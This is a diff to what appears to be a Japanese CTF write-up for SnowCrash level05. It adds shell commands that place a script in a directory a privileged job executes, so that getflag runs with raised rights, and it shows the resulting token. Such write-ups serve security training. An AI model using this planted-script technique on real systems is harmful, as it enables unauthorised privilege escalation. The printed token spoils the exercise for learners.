@@ -42,6 +42,14 @@ for i in /opt/openarenaserver/* ; do
 done
 ```
 
+/opt/openarenaserver`ディレクトリ内のファイルを実行しているため、`/opt/openarenaserver`ディレクトリに`getflag.sh`を作成し、`getflag`を実行するスクリプトを作成する
+
+```sh
+echo '#!/bin/sh' > /opt/openarenaserver/getflag.sh
+echo 'getflag > /tmp/flag_output' >> /opt/openarenaserver/getflag.sh
+chmod +x /opt/openarenaserver/getflag.sh
+```
+
 ```sh
 level05@SnowCrash:~$ cat /tmp/flag_output
 Check flag.Here is your token : viuaaale9huek52boumoomioc
